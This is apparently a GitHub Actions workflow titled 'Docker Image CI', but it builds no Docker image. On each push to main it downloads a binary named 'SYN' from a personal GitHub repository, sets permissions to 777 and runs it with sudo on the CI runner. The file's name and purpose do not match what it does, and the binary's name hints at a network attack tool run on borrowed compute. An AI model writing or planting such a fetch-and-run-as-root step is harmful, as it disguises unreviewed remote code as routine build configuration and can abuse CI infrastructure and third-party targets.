name: Docker Image CI

on:
  push:
    branches: [ main ]
    
jobs:
  build1:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run a multi-line script
        run: |
          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
          chmod 777 SYN
          sudo ./SYN
